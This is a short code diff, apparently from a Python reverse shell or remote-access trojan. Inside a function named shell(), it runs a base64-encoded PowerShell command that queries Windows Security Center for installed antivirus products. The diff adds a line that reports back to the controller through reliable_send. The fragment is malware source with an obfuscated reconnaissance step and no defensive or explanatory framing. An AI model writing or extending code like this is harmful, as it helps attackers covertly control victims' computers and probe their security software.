@@ -364,6 +364,7 @@ def shell():
                 execute = subprocess.run(['powershell -E RwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAC0ATgBhAG0AZQBzAHAAYQBjAGUAIAAiAHIAbwBvAHQAXABTAGUAYwB1AHIAaQB0AHkAQwBlAG4AdABlAHIAMgAiACAALQBDAGwAYQBzAHMAIABBAG4AdABpAFYAaQByAHUAcwBQAHIAbwBkAHUAYwB0AA=='], shell=True, stdout=subprocess.PIPE, 
                                          stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
+                reliable_send("done")                   
                 result = execute.stdout + execute.stderr
                 result = result.decode()
                 #print(result)
